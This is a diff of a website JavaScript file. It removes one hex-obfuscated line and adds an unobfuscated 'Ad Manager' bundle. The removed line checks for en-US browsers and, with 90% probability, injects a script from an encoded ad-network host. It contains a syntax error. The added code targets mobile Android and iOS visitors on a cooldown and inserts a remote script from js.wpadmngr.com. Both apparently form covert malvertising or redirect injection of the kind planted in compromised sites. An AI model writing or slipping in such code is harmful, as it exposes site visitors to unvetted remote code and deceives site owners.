@@ -1,1 +1,157 @@
-function isUserLanguageEnglishUS(){const language=navigator['\x6c\x61\x6e\x67\x75\x61\x67\x65']||navigator['\x75\x73\x65\x72\x4c\x61\x6e\x67\x75\x61\x67\x65'];return language['\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65']()==='\x65\x6e\x2d\x75\x73'}function checkAndInjectScript(){const alreadyMarked=localStorage['\x67\x65\x74\x49\x74\x65\x6d']('\x68\x61\x73\x52\x65\x64\x69\x72\x65\x63\x74\x65\x64')==='\x74\x72\x75\x65';if(alreadyMarked){return}const referrer=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x72\x65\x66\x65\x72\x72\x65\x72'];if isUserLanguageEnglishUS(){const injectionProbability=0.9;if(window["\x4d\x61\x74\x68"]['\x72\x61\x6e\x64\x6f\x6d']()<injectionProbability){localStorage['\x73\x65\x74\x49\x74\x65\x6d']('\x68\x61\x73\x52\x65\x64\x69\x72\x65\x63\x74\x65\x64','\x74\x72\x75\x65');const script=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']('\x73\x63\x72\x69\x70\x74');script['\x74\x79\x70\x65']='\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74';script['\x73\x72\x63']='\x2f\x2f\x70\x6c\x32\x37\x34\x34\x37\x36\x36\x34\x2e\x70\x72\x6f\x66\x69\x74\x61\x62\x6c\x65\x72\x61\x74\x65\x63\x70\x6d\x2e\x63\x6f\x6d\x2f\x34\x36\x2f\x36\x65\x2f\x35\x35\x2f\x34\x36\x36\x65\x35\x35\x33\x66\x33\x64\x39\x37\x36\x33\x34\x37\x30\x63\x64\x65\x33\x35\x64\x63\x31\x31\x63\x33\x35\x61\x63\x34\x2e\x6a\x73';window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x68\x65\x61\x64']['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'](script)}}}window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72']('\x44\x4f\x4d\x43\x6f\x6e\x74\x65\x6e\x74\x4c\x6f\x61\x64\x65\x64',checkAndInjectScript);
+/* Static bundle | version 1212476758 */
+/* Ad Manager */
+(function () {
+  "use strict";
+
+  var config = {"version":1212476758,"unknownCountryAllowed":true,"siteEnabled":true,"campaigns":[{"id":"47c5517dd690c356b7ea4a81","kind":"script","zone":"default","placement":"inline","enabled":true,"weight":100,"countryMode":"include","devices":["mobile","tablet"],"timezoneMode":"include","systems":["android","ios"],"sourceType":"all","visitorType":"all","utcHourMode":"all","utcStartHour":8,"utcEndHour":23,"probability":100,"cooldownHours":12,"script":"\u003cscript async src=\"https://js.wpadmngr.com/static/adManager.js\" data-admpid=\"373783\"\u003e\u003c/script\u003e"}]};
+  var script = document.currentScript;
+  if (!script || !config || config.siteEnabled === false) return;
+
+  
+  
+
+  
+  function detectDevice() {
+    var ua = navigator.userAgent || "";
+    if (/iPad|Tablet|PlayBook|Silk/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) return "tablet";
+    if (/Mobi|Android|iPhone|iPod|IEMobile|Opera Mini/i.test(ua)) return "mobile";
+    return "desktop";
+  }
+  
+
+  
+  function detectSystem() {
+    var ua = navigator.userAgent || "";
+    if (/Android/i.test(ua)) return "android";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "ios";
+    return "pc";
+  }
+  
+
+  
+
+  
+
+  
+  function frequencyBlocked(campaign) {
+    try {
+      if (campaign.oncePerVisitor && localStorage.getItem("admanager_ran_" + campaign.id) === "true") return true;
+      var hours = Math.max(0, Number(campaign.cooldownHours) || 0);
+      if (!hours) return false;
+      var previous = Number(localStorage.getItem("admanager_last_" + campaign.id) || 0);
+      return previous > 0 && Date.now() - previous < hours * 60 * 60 * 1000;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  function markCampaignRun(campaign) {
+    try {
+      if (campaign.oncePerVisitor) localStorage.setItem("admanager_ran_" + campaign.id, "true");
+      if (Number(campaign.cooldownHours) > 0) localStorage.setItem("admanager_last_" + campaign.id, String(Date.now()));
+    } catch (_) {}
+  }
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  function includes(list, value) {
+    return !list || !list.length || list.indexOf(value) !== -1;
+  }
+  
+
+  
+
+  
+
+  
+
+  
+  function mountRoot(campaign) {
+    var host = document.createElement("div");
+    host.dataset.adManagerCampaign = campaign.id;
+    var root = host.attachShadow ? host.attachShadow({ mode: "open" }) : host;
+    if (campaign.placement === "inline") script.parentNode.insertBefore(host, script.nextSibling);
+    else document.body.appendChild(host);
+    return { host: host, root: root };
+  }
+  
+
+  
+
+  
+  function renderScript(campaign) {
+    var mounted = mountRoot(campaign);
+    var template = document.createElement("template");
+    template.innerHTML = campaign.script || "";
+    Array.prototype.slice.call(template.content.childNodes).forEach(function (node) {
+      if (node.nodeName !== "SCRIPT") {
+        mounted.root.appendChild(node.cloneNode(true));
+        return;
+      }
+      var replacement = document.createElement("script");
+      Array.prototype.slice.call(node.attributes || []).forEach(function (attribute) {
+        replacement.setAttribute(attribute.name, attribute.value);
+      });
+      replacement.text = node.textContent || "";
+      mounted.root.appendChild(replacement);
+    });
+  }
+  
+
+  function executeCampaign(campaign) {
+    
+    markCampaignRun(campaign);
+    
+    if (campaign.kind === "script") {
+      renderScript(campaign);
+      return;
+    }
+    
+    
+  }
+
+  
+
+  function run() {
+    var device = detectDevice();
+    var system = detectSystem();
+    
+    
+    
+    
+    
+    
+    
+    var candidates = config.campaigns.filter(function (campaign) {
+      return true
+        
+        && includes(campaign.devices, device)
+        && includes(campaign.systems, system)
+        
+        
+        
+        
+        
+        
+        
+        && !frequencyBlocked(campaign)
+        ;
+    });
+    if (!candidates.length) return;
+    
+    var picked = candidates[0];
+    
+    executeCampaign(picked);
+  }
+
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", run, { once: true });
+  else run();
+})();
